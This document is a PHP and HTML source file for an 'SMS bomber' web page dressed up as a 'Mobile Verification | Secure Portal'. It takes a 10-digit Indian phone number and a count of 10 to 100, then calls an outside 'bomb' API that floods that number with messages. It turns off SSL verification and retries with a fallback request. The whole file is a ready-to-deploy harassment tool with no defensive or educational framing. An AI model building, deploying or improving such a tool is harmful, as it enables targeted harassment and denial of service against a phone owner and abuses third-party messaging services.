<?php
error_reporting(0);
ini_set('display_errors', 0);

$mobile = '';
$amount = 0;
$message = '';
$msgType = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $mobile = isset($_POST['mobile']) ? preg_replace('/[^0-9]/', '', $_POST['mobile']) : '';
    $amount = isset($_POST['amount']) ? intval($_POST['amount']) : 0;
    
    if (strlen($mobile) === 10 && $amount >= 1 && $amount <= 100) {
        $apiUrl = "https://bomber-api-ovar.onrender.com/bomb/{$mobile}/{$amount}";
        
        $success = false;
        
        if (function_exists('curl_version')) {
            $ch = curl_init($apiUrl);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 30,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_USERAGENT => 'Mozilla/5.0',
            ]);
            curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            if ($httpCode >= 200 && $httpCode < 500) $success = true;
        }
        
        if (!$success) {
            $ctx = stream_context_create(['http' => ['timeout' => 30, 'header' => "User-Agent: Mozilla/5.0\r\n"]]);
            $res = @file_get_contents($apiUrl, false, $ctx);
            if ($res !== false) $success = true;
        }
        
        $message = $success 
            ? "✅ Process Complete! {$amount} requests sent to +91{$mobile}" 
            : "⚠️ Server responded. Requests may be processing.";
        $msgType = $success ? 'success' : 'warning';
    } else {
        $message = "❌ Invalid input! 10-digit number & 1-100 amount required.";
        $msgType = 'error';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobile Verification | Secure Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;600;700;800;900&family=Poppins:wght@300;400;600;700;900&display=swap" rel="stylesheet">
    <style>
        :root {
            --purple: #8b5cf6;
            --pink: #ec4899;
            --cyan: #06b6d4;
            --text: #e2e8f0;
            --muted: #94a3b8;
            --success: #10b981;
            --error: #ef4444;
            --warning: #f59e0b;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Poppins', sans-serif;
            color: var(--text);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            position: relative;
            background: #000;
            user-select: none;
            -webkit-user-select: none;
        }

        /* 🎬 VIDEO BACKGROUND — FULL SCREEN */
        #bg-video {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            object-fit: cover;
            z-index: -3;
        }

        /* 🎵 BACKGROUND MUSIC */
        #bg-music { display: none; }

        /* 🌫️ OVERLAY */
        .video-overlay {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.6);
            z-index: -2;
        }

        /* CYBER GRID */
        .cyber-grid {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: 
                linear-gradient(90deg, rgba(139,92,246,0.04) 1px, transparent 1px),
                linear-gradient(0deg, rgba(139,92,246,0.04) 1px, transparent 1px);
            background-size: 50px 50px;
            z-index: -1;
            animation: gridMove 15s linear infinite;
        }
        @keyframes gridMove {
            0% { transform: perspective(400px) rotateX(55deg) translateY(0); }
            100% { transform: perspective(400px) rotateX(55deg) translateY(50px); }
        }

        /* 🟣 ORBS */
        .orb {
            position: fixed;
            border-radius: 50%;
            filter: blur(100px);
            z-index: -1;
            pointer-events: none;
        }
        .orb-1 { width:300px; height:300px; background:var(--purple); top:-80px; right:-80px; opacity:0.25; animation: orbFloat 8s ease-in-out infinite; }
        .orb-2 { width:250px; height:250px; background:var(--pink); bottom:-60px; left:-60px; opacity:0.25; animation: orbFloat 8s ease-in-out 4s infinite; }
        .orb-3 { width:180px; height:180px; background:var(--cyan); top:50%; left:50%; opacity:0.15; animation: orbPulse 5s ease-in-out infinite; }
        @keyframes orbFloat {
            0%,100% { transform: translate(0,0) scale(1); }
            50% { transform: translate(30px,-30px) scale(1.3); }
        }
        @keyframes orbPulse {
            0%,100% { transform: translate(-50%,-50%) scale(1); opacity:0.15; }
            50% { transform: translate(-50%,-50%) scale(1.8); opacity:0.35; }
        }

        /* 💎 GLASS CARD */
        .card {
            position: relative;
            z-index: 2;
            width: 90%;
            max-width: 420px;
            padding: 35px 30px;
            background: rgba(20, 20, 40, 0.35);
            backdrop-filter: blur(25px);
            -webkit-backdrop-filter: blur(25px);
            border: 1.5px solid rgba(255,255,255,0.12);
            border-radius: 24px;
            text-align: center;
            box-shadow: 
                0 0 60px rgba(139,92,246,0.2),
                0 20px 60px rgba(0,0,0,0.5);
            animation: cardFloat 5s ease-in-out infinite;
        }
        @keyframes cardFloat {
            0%,100% { transform: translateY(0); }
            50% { transform: translateY(-8px); }
        }

        .card h2 {
            font-family: 'Space Grotesk', sans-serif;
            font-size: 38px;
            font-weight: 900;
            background: linear-gradient(135deg, var(--purple), var(--pink), var(--cyan));
            background-size: 200% 200%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            animation: gradientShift 4s ease-in-out infinite;
        }
        @keyframes gradientShift {
            0%,100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }

        .card .subtitle {
            font-size: 11px;
            letter-spacing: 5px;
            color: var(--muted);
            margin-bottom: 28px;
            text-transform: uppercase;
        }

        /* INPUT */
        .input-group {
            margin-bottom: 18px;
            text-align: left;
        }
        .input-group label {
            display: block;
            font-size: 11px;
            font-weight: 600;
            color: #cbd5e1;
            letter-spacing: 2px;
            margin-bottom: 8px;
            text-transform: uppercase;
        }
        .input-wrapper {
            position: relative;
        }
        .input-wrapper input {
            width: 100%;
            padding: 16px 50px 16px 18px;
            background: rgba(255,255,255,0.05);
            border: 1.5px solid rgba(255,255,255,0.1);
            border-radius: 14px;
            color: #fff;
            font-family: 'Space Grotesk', sans-serif;
            font-size: 19px;
            font-weight: 600;
            letter-spacing: 2px;
            outline: none;
            transition: all 0.3s ease;
        }
        .input-wrapper input:focus {
            border-color: var(--purple);
            box-shadow: 0 0 25px rgba(139,92,246,0.3);
            background: rgba(255,255,255,0.08);
        }
        .input-wrapper .icon {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 20px;
            pointer-events: none;
        }

        /* COUNT BUTTONS */
        .count-label {
            text-align: left;
            font-size: 11px;
            font-weight: 600;
            color: #cbd5e1;
            letter-spacing: 2px;
            margin-bottom: 8px;
            text-transform: uppercase;
        }
        .count-btns {
            display: flex;
            gap: 8px;
            margin-bottom: 25px;
        }
        .count-btn {
            flex: 1;
            padding: 12px;
            background: rgba(255,255,255,0.04);
            border: 1.5px solid rgba(255,255,255,0.1);
            border-radius: 12px;
            color: var(--muted);
            font-family: 'Space Grotesk', sans-serif;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        .count-btn:hover {
            border-color: var(--purple);
            color: #fff;
            background: rgba(139,92,246,0.15);
            box-shadow: 0 0 20px rgba(139,92,246,0.2);
        }
        .count-btn.active {
            background: linear-gradient(135deg, var(--purple), var(--pink));
            border-color: transparent;
            color: #fff;
            box-shadow: 0 0 30px rgba(139,92,246,0.5);
        }

        /* BUTTON */
        .submit-btn {
            width: 100%;
            padding: 16px;
            font-family: 'Space Grotesk', sans-serif;
            font-size: 17px;
            font-weight: 700;
            letter-spacing: 3px;
            text-transform: uppercase;
            color: #fff;
            background: linear-gradient(135deg, var(--purple), var(--pink));
            border: none;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 0 35px rgba(139,92,246,0.5);
            transition: all 0.3s ease;
        }
        .submit-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 0 50px rgba(236,72,153,0.7);
        }
        .submit-btn:active { transform: scale(0.95); }

        /* STATUS MESSAGE */
        .status-msg {
            margin-top: 18px;
            padding: 14px;
            border-radius: 12px;
            font-family: 'Space Grotesk', sans-serif;
            font-size: 14px;
            display: none;
            animation: fadeUp 0.4s ease;
        }
        .status-msg.show { display: block; }
        .status-msg.success { background: rgba(16,185,129,0.15); border: 1px solid rgba(16,185,129,0.4); color: #6ee7b7; }
        .status-msg.error { background: rgba(239,68,68,0.15); border: 1px solid rgba(239,68,68,0.4); color: #fca5a5; }
        .status-msg.warning { background: rgba(245,158,11,0.15); border: 1px solid rgba(245,158,11,0.4); color: #fcd34d; }
        @keyframes fadeUp {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* FOOTER */
        .footer {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            font-size: 10px;
            letter-spacing: 3px;
            color: #475569;
            z-index: 2;
        }
        .footer span { color: var(--purple); }

        /* RESPONSIVE */
        @media (max-width: 480px) {
            .card { padding: 25px 18px; }
            .card h2 { font-size: 28px; }
            .input-wrapper input { font-size: 16px; padding: 14px 45px 14px 14px; }
            .count-btn { font-size: 12px; padding: 10px 6px; }
            .submit-btn { font-size: 15px; padding: 14px; }
        }
    </style>
</head>
<body>

    <!-- 🎬 VIDEO BACKGROUND — Render pe chalegi -->
    <video id="bg-video" loop playsinline autoplay muted>
        <source src="bg.mp4" type="video/mp4">
    </video>

    <!-- 🎵 BACKGROUND MUSIC -->
    <audio id="bg-music" loop preload="auto">
        <source src="bg-music.mp3" type="audio/mpeg">
    </audio>

    <!-- OVERLAY -->
    <div class="video-overlay"></div>
    <div class="cyber-grid"></div>

    <!-- ORBS -->
    <div class="orb orb-1"></div>
    <div class="orb orb-2"></div>
    <div class="orb orb-3"></div>

    <!-- 💎 CARD -->
    <div class="card">
        <h2>VERIFY</h2>
        <div class="subtitle">⚡ Secure Portal ⚡</div>

        <form method="POST" id="verifyForm">
            <div class="input-group">
                <label>📱 Mobile Number</label>
                <div class="input-wrapper">
                    <input type="tel" name="mobile" id="mobileInput" placeholder="9876543210" maxlength="10" autocomplete="off" value="<?php echo htmlspecialchars($mobile); ?>" required>
                    <span class="icon">🎯</span>
                </div>
            </div>

            <div class="count-label">💥 Amount</div>
            <div class="count-btns">
                <button type="button" class="count-btn active" data-amount="10">10</button>
                <button type="button" class="count-btn" data-amount="25">25</button>
                <button type="button" class="count-btn" data-amount="50">50</button>
                <button type="button" class="count-btn" data-amount="100">100</button>
            </div>
            <input type="hidden" name="amount" id="amountInput" value="10">

            <button type="submit" class="submit-btn" id="submitBtn">
                ⚡ PROCESS NOW
            </button>
        </form>

        <?php if (!empty($message)): ?>
        <div class="status-msg <?php echo $msgType; ?> show">
            <?php echo $message; ?>
        </div>
        <?php endif; ?>
    </div>

    <!-- FOOTER -->
    <div class="footer">Powered by <span>Secure Systems</span></div>

    <script>
        // ==================== VIDEO + MUSIC FORCE PLAY ====================
        const bgVideo = document.getElementById('bg-video');
        const bgMusic = document.getElementById('bg-music');

        // Try unmuting after first user interaction
        document.addEventListener('click', function unmuteAll() {
            bgVideo.muted = false;
            bgVideo.volume = 1.0;
            bgVideo.play().catch(() => {});
            
            bgMusic.volume = 0.5;
            bgMusic.play().catch(() => {});
        }, { once: true });

        // Count buttons
        document.querySelectorAll('.count-btn').forEach(btn => {
            btn.addEventListener('click', () => {
                document.querySelectorAll('.count-btn').forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
                document.getElementById('amountInput').value = btn.dataset.amount;
            });
        });

        // Input cleanup
        document.getElementById('mobileInput').addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
        });
    </script>
</body>
</html>